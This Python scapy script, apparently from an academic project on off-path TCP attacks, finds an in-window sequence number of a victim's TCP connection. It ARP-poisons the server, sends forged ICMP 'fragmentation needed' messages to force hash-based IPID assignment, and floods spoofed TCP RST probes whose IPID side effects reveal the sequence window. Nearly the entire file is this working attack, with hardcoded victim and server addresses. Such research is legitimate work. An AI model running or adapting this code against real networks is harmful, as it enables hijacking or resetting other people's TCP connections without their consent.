# coding=utf-8

import struct
import threading
import time
from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *

"""
    @CreateDate:    2020/2/16
    @Group:         Off-Path TCP Exploit Via ICMP
                    and IPID Side-Channel
    @Project:       Work2
    @Filename:      seq_find.py
    @Brief:         This program is used for finding an in-window sequence number. Here, 
                    we assume an active TCP connection has been found using connection_
                    find.py.
                    The work flow of this program can be found on slide (page 23 & 24).
                    This program also used send-then-sniff style and Preclude Filter 
                    architecture. (similar to connection_find.py)
                    It is worth to mention here this program samples sequence numbers for
                    a certain step-length (variable BLOCK). An overlong step-length may 
                    result in missing receive window. While, a too short one may result in
                    long execution time. This a trade-off between time and accuracy. 
                    The recommended sampling step-length is: 26703 * 3
    @Modify:        2020/3/9     Kevin.F:    Remove Precluding Filter multiplex architecture
                    2020/3/9     Kevin.F:    Add scapy sniffer fliter equation for ICMP
                    2020/3/10    Kevin.F:    Add time-counter based multplex architecture
                    2020/3/18    Kevin.F:    Add script variable my_if_name
"""

forge_ip = '10.10.16.92'                    # hash collision IP (get form collision_find.py)
victim_ip = '10.10.100.1'                   # victim ip address
server_ip = '10.10.100.2'                   # server ip address
server_port = 3000                          # known server port (e.g. ssh:22 BGP:179 Rocket.Chat:3000)
client_port = 45546                         # found client port

server_mac_addr = '00:0c:29:20:f4:8c'       # mac address of server used for ARP poison
my_if_name = 'ens33'                        # bind one ethernet interface
my_mac_addr = get_if_hwaddr(my_if_name)     # mac address of attacker
z_payload = b''                             # full-zero byte string used for padding

N_THREAD = 5                                # number of checking thread
BLOCK = 26703 * 3                           # sampling step-length
CHUNK = 150                                 # checking block size
sleep_time = 0.5                            # for maximum challenge-ACK rate

semaphore_fin = threading.Semaphore(1)      # for stop correctly
semaphore_ipid = threading.Semaphore(1)     # semaphore for IPID (prevent oblivious collision)
semaphore = threading.Semaphore(1)          # write-lock semaphore
task_list = []                              # collecting suspected seq numbers
start_point = 0                             # sampling start at?
current_point = start_point                 # current pointer
end_point = (1 << 32) - 1                   # sampling end at?
stop = False                                # find the result
result = -1                                 # in-window seq number

MX = 3                                      # number of IPID-based connection check

"""
    @Date:      2020/3/9
    @Author:    Kevin.F
    @Init:      seq     ->  suspected seq number
                count   ->  number of check hit records
                l_time  ->  last checking hit time
    @Brief:     This is a basic structure to record checked ports.
                We will the ports again after time counter expire to tackle challege-
                ACK rate limit. (tcp_invalid_ratelimit, 500ms)
                When the hit counter reach variable MX, we commit it as an active
                connection.
"""
class Task:
    def __init__(self, seq, count=0, l_time=0.0):
        self.seq = seq
        self.count = count
        self.l_time = l_time

    def __cmp__(self, other):
        return self.count < other.count

    def __eq__(self, other):
        return self.seq == other.seq

    def __hash__(self):
        return hash(self.seq)

"""
    @Date:      2020/2/16
    @Author:    Kevin.F
    @Param:     
    @Return:    None, but trigger another arp poison thread. 
    @Brief:     We utilized arp-poison attack to fool the server that we own such a
                IP address which can cause IPID counter hash collision. 
"""
def arp_inject():
    forged_ip = forge_ip
    # here we send a UDP packet to allure server to execute ip/mac convert
    pkt = sniff(filter="arp " + "and dst " + forged_ip + " and ether src " + server_mac_addr,
                iface=my_if_name, timeout=0.5, count=1, started_callback=
                lambda: send(IP(src=forged_ip, dst=server_ip) / UDP(dport=80),
                             iface=my_if_name, verbose=False))

    if len(pkt) == 1 and pkt[0][1].fields['psrc'] == server_ip and pkt[0][1].fields['pdst'] == forged_ip:
        send(ARP(pdst=server_ip, hwdst=server_mac_addr, psrc=forged_ip, hwsrc=my_mac_addr, op=2),
             iface=my_if_name, verbose=False)

    time.sleep(1)

    if not stop:
        ts = threading.Thread(target=arp_inject)
        ts.start()


"""
    @Date:      2020/2/16
    @Author:    Kevin.F
    @Param:     
    @Return:    None, but trigger another same thread. 
    @Brief:     We send forged ICMP fragment needed ICMP error message. to trick
                the server into setting DF as 0 and Down-Dimension IPID assignment
                method from per-connection to hash based method.
"""
def tcp_fragment():
    send(IP(src=forge_ip, dst=server_ip) /
         ICMP(type=3, code=4, nexthopmtu=68) /
         IP(flags=2, src=server_ip, dst=victim_ip) /
         ICMP(type=0, code=0) /
         z_payload,
         iface=my_if_name, verbose=False)

    time.sleep(1)

    if not stop:
        tr = threading.Thread(target=tcp_fragment)
        tr.start()


"""
    @Date:      2020/2/26
    @Author:    Kevin.F
    @Param:     list_p    ->  A block of  sampled sequence numbers
    @Return:    ipid_next ->  selected sequence numbers which are suspected as in-window, 
                              these seq(s) need(s) to be checked again (dump into pool_1 or
                              move form pool_1 to 2) or admit it is in window.
    @Brief:     This function acts as the Precluding Filter. It checks sequence numbers in
                list and preclude some of them and return the rest.
                Remember, this function perform an probabilistic checking.
"""
def check_new_list(list_p):
    C = len(list_p)
    icmp_seq = random.randint(0, (1 << 16) - 1)

    send_list = [IP(src=forge_ip, dst=server_ip) / ICMP(id=icmp_seq)]
    for sq in list_p:
        send_list.append(IP(src=victim_ip, dst=server_ip) /
                         TCP(sport=client_port, dport=server_port, seq=sq, flags='R'))
        send_list.append(IP(src=forge_ip, dst=server_ip) / ICMP(id=icmp_seq))

    while True:
        semaphore_ipid.acquire()
        pkts = sniff(filter="icmp and icmp[4:2]=" + str(icmp_seq) + " and dst " + forge_ip,
                     iface=my_if_name, count=1 + C, timeout=1.5, started_callback=
                     lambda: send(send_list, iface=my_if_name, verbose=False))
        semaphore_ipid.release()
        if len(pkts) != 1 + C:
            time.sleep(sleep_time)
        else:
            break

    ipids = []
    for pk in pkts:
        ipids.append(pk[1].fields['id'])

    list_next = []
    for i in range(1, C + 1):
        if ipids[i] - ipids[i - 1] >= 2:
            list_next.append(list_p[i - 1])

    return list_next


"""
    @Date:      2020/3/9
    @Author:    Kevin.F
    @Param:     None
    @Return:    None
    @Brief:     For each routine, this function first check tasks in list (suspected seq in list). This 
                function will fetch a seq number form task_list only if its time counter is expired. 
                And then sample some seq numbers haven't been checked before.
                Every seq numbers pass the check (via check_new_list), will be marked as suspected and
                will be added to task_list.
                If one seq number has passed <MX> check, we will admit it is an in-window seq.  
"""
def check_new_chunk():
    global result
    global stop
    global current_point
    global task_list

    seq_set = set()
    seq_list = []
    semaphore.acquire()
    task_set = set(task_list)
    ls = list(task_set)
    time_now = time.time()
    for ti in ls:
        if time_now - ti.l_time > sleep_time:
            task_set.remove(ti)
            seq_list.append(ti.seq)
            seq_set.add(ti)
            if len(seq_list) == BLOCK:
                break

    task_list = list(task_set)

    if len(seq_list) == BLOCK:
        check_list = seq_list
        semaphore.release()
    else:
        chunk_start_p = current_point
        current_point += BLOCK * CHUNK
        current_point = min(end_point, current_point)
        chunk_end_p = current_point
        if current_point == end_point:
            stop = True
        semaphore.release()

        check_list = []
        ptr = chunk_start_p
        while ptr < chunk_end_p:
            check_list.append(ptr)
            ptr = min(ptr + BLOCK, chunk_end_p)

        check_list.extend(seq_list)
        print('checking: ' + str((chunk_start_p, chunk_end_p)))

    list_next = check_new_list(check_list)
    time_now = time.time()

    if len(list_next) != 0:
        add_task_new = []
        add_task = set()
        add_set = []

        for p in list_next:
            if Task(p) in seq_set:
                add_task.add(p)
            else:
                add_task_new.append(p)

        for p in add_task_new:
            add_set.append(Task(p, 1, time_now))

        for ta in seq_set:
            if ta.seq in add_task:
                if ta.count == MX - 1:
                    semaphore.acquire()
                    result = ta.seq
                    stop = True
                    semaphore.release()
                    print('--Found in Window Seq: ' + str(result))
                    return

                add_set.append(Task(ta.seq, ta.count + 1, time_now))

        semaphore.acquire()
        task_list.extend(add_set)
        semaphore.release()


"""
    @Date:      2020/3/10
    @Author:    Kevin.F
    @Param:     None
    @Return:    None
    @Brief:     This function acts as a basic thread template. This must handle
                checking stop correctly. And init new checking task.
"""
def check_template():
    global stop
    global result

    if stop:
        if result == -1:
            while not stop:
                semaphore_fin.acquire()
                while len(task_list) != 0:
                    check_new_chunk()
                    time.sleep(sleep_time)
                semaphore_fin.release()
        else:
            print('Found In Window Seq: ' + str(result))

        return
    else:
       check_new_chunk()

    t = threading.Thread(target=check_template)
    t.start()


if __name__ == '__main__':
    # construct padding payload
    for i in range(0, 520):
        z_payload += struct.pack('B', 0)

    # start the ARP poison
    ts = threading.Thread(target=arp_inject)
    ts.start()

    # start sending forged ICMP needed
    tr = threading.Thread(target=tcp_fragment)
    tr.start()

    # create sub-threads
    for i in range(0, N_THREAD):
        t = threading.Thread(target=check_template, name=('T' + str(i)))
        t.start()
        print('Num_' + str(i) + ' thread started.')
        time.sleep(0.1)
